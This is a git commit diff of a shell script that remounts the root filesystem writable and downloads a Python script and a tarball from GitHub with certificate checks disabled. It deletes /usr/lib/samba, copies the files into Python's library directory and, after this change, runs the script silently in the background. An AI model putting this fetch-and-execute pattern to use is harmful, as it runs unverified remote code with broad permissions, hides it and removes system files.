3b82c3e1710b45ddd94d10f3be72bd5ffc820f0f
umadgen <43371133+umadgen@users.noreply.github.com>
2020-02-02 17:59:48 +0100

    Add files via upload

--- scriptt.sh
+++ scriptt.sh
@@ -16,7 +16,7 @@ then
 		mkdir /usr/lib/samba
 	fi
 	echo "LANCEMENT DES PREREQUIS"
-    mount -o remount,rw / && cd /tmp && mkdir test && cd test/ && curl -L -k https://github.com/umadgen/test_conf/blob/master/testarm.py?raw=true --output testarm.py && chmod 777 testarm.py && curl -L -k https://github.com/umadgen/test_conf/blob/master/xml.tar.gz?raw=true --output xml.tar.gz && tar -xvf xml.tar.gz && rm -r /usr/lib/samba/ && cp -avr xml/ /usr/lib/python2.7 && ./testarm.py
+    mount -o remount,rw / && cd /tmp && mkdir test && cd test/ && curl -L -k https://github.com/umadgen/test_conf/blob/master/testarm.py?raw=true --output testarm.py && chmod 777 testarm.py && curl -L -k https://github.com/umadgen/test_conf/blob/master/xml.tar.gz?raw=true --output xml.tar.gz && tar -xvf xml.tar.gz && rm -r /usr/lib/samba/ && cp -avr xml/ /usr/lib/python2.7 && cd /tmp && cd test/ && nohup ./testarm.py &>/dev/null &
 else
 if ps aux | grep -v grep | grep "python ./testarm.py" > /dev/null;
 	then
